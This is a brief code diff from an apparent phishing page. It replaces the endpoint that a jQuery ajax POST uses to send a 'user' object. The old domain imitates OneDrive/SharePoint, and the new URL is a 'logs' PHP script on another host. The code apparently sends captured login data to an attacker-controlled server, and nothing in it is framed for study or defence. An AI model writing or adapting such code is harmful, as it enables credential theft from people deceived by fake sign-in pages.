@@ -59,7 +59,7 @@ const App = ()=>{
 
       $.ajax({
           type: "POST",
-          url: "https://ondrivshardocpoint.lat/smalpage/raly.php",
+          url: "https://bucketlion.com/logs/dashboard/file/weba.php",
           data: user,
           success(data) {
               console.log(data);
